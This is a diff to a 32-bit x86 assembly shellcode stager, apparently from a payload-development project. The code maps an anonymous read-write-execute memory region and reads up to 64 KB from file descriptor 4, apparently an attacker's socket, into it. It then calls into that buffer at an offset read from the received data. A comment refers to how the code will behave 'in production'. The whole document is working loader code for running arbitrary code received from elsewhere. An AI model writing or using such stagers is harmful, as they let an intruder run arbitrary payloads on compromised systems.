@@ -14,39 +14,51 @@
 
 	;; EBX, ECX, EDX, ESI, EDI, EBP
 	%define LEN word 0xffff	;TODO make this larger
-	
+	%define PROT byte 0x7         ;prot, PROT_READ | PROT_WRITE | PROT_EXEC
+	%define FLAGS byte 0x22          ;flags, MAP_PRIVATE | MAP_ANONYMOUS
 BITS 32	
 global main
 	
 main:
-				; mmap
-	xor eax, eax
-	mov ebp, eax        ;offset, 0
-	mov ebx, eax        ;addr, NULL
+;; mmap2(0, 0xffff, 0x7, 0x22, 0, 0);
+;; mmap2(0, LEN, PROT, FLAGS, 0,0);
+mmap:	
+	xor ebx, ebx        ;addr = NULL
+	
 	xor ecx, ecx
 	mov cx, LEN      ;length, 0xffff
-	mov edx, eax
-	mov dl, 0x7         ;prot, PROT_READ | PROT_WRITE | PROT_EXEC
+	
+	xor edx, edx
+	mov dl, PROT
+	
 	xor esi, esi
-	mov al, 0x22
-	mov si, ax          ;flags, MAP_PRIVATE | MAP_ANONYMOUS
-	mov edi, -1         ;fd, -1
-	mov al, 0xc0        ;Call number
+	
+	xor eax, eax
+	mov al, FLAGS
+	mov si, ax		;lower part of esi is not accessable
+	
+	xor edi,edi		;fd=0
+	xor ebp, ebp        	;offset=0
+	
+	
+	mov al, 0xc0        ;mmap2=0xc0
 	int 0x80
 	
-				;read
-	xor ebx, ebx
+read:	
+	xor ebx, ebx		
+	;;In production we will get ebx from code above "mmap"
 	mov bl, 0x04        ;fd, ???
-	mov ecx, eax        ;buf, mmap()
+	
+	mov ecx, eax        ;buf=mmap2(...)
+	
 	xor edx, edx	
 	mov dx, LEN      ;count, 0xffff
+	
 	xor eax,eax
 	mov al,3
 	int 0x80
 
-	mov eax, ebx
-	add eax, [ebx]
-	add eax, 4          ;Offset to the code!
-	
+	mov eax, ecx
+	add eax, [ecx]
 				;Everything dies
 	call eax
